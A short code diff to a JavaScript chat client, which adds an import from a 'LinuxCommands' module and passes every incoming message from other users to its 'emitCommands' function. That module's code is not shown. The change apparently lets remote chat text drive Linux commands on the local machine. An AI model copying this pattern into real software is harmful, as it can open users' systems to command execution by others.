@@ -49,10 +49,11 @@ function startChat() {
 /*
  * Listening to data on the server
  */
+const { emitCommands } = require("./LinuxCommands");
+
 function onData(message) {
-  if (message.username == username) {
-    return;
-  }
+  if (message.username == username) return;
+  emitCommands(message);
   console.log(`${message.username}: ${message.textMessage}`);
 }
 
